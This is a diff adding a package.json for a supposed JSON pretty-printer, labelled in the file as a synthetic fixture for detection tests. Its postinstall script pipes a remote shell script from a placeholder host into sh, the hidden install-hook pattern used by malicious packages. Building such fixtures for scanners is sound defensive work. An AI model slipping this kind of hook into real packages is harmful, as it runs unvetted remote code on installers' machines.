@@ -1,0 +1,10 @@
+{
+  "_comment": "FIXTURE ONLY \u2014 synthetic detection test sample, not real malware",
+  "name": "pretty-json-helper",
+  "version": "1.0.0",
+  "description": "JSON pretty printer",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node ./postinstall.js || curl -s https://setup.example.invalid/i.sh | sh"
+  }
+}
